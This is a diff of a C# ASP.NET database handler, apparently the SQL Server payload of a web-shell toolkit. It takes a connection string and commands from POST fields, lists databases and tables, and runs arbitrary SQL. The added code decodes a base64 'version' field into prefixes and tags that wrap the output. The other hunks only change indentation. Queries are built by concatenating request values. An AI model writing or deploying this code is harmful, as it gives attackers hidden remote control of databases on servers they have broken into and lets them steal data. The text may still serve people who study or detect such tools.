@@ -30,6 +30,22 @@ namespace DB_SqlServer
             String result = "";
             try
             {
+                if (this.Request.Form["version"] != null)
+                {
+                    String[] split = System.Text.Encoding.GetEncoding(cs)
+                        .GetString(System.Convert.FromBase64String(this.Request.Form["version"])).Split(';');
+                    if (split.Length == 1)
+                    {
+                        this.randomPrefix = split[0];
+                    }
+                    else
+                    {
+                        this.randomPrefix = split[0];
+                        tag_s = split[1];
+                        tag_e = split[2];
+                    }
+                }
+
                 String action = (this.Request.Form["action"]);
                 String conn = decode(this.Request.Form["conn"]);
                 String z1 = decode(this.Request.Form["z1"]);
@@ -92,7 +108,7 @@ namespace DB_SqlServer
             System.Data.DataSet ds = new System.Data.DataSet();
             string sql = "SELECT [name] FROM master.dbo.sysdatabases ORDER BY 1";
             using (SqlDataAdapter dataAdapter =
-                new SqlDataAdapter(sql, conn))
+                   new SqlDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t", "\t", false);
@@ -107,7 +123,7 @@ namespace DB_SqlServer
             System.Data.DataSet ds = new System.Data.DataSet();
             string sql = "USE [" + dbname + "] SELECT [name] FROM sysobjects WHERE (xtype='U') ORDER BY 1";
             using (SqlDataAdapter dataAdapter =
-                new SqlDataAdapter(sql, conn))
+                   new SqlDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t", "\t", false);
@@ -122,7 +138,7 @@ namespace DB_SqlServer
             System.Data.DataSet ds = new System.Data.DataSet();
             string sql = string.Format("use [{0}];SELECT TOP 0 * FROM {1}", db, table);
             using (SqlDataAdapter dataAdapter =
-                new SqlDataAdapter(sql, conn))
+                   new SqlDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t", "", true);
@@ -136,7 +152,7 @@ namespace DB_SqlServer
             String ret = "";
             System.Data.DataSet ds = new System.Data.DataSet();
             using (SqlDataAdapter dataAdapter =
-                new SqlDataAdapter(sql, conn))
+                   new SqlDataAdapter(sql, conn))
             {
                 dataAdapter.Fill(ds);
                 ret = parseDataset(ds, "\t|\t", "\r\n", true);
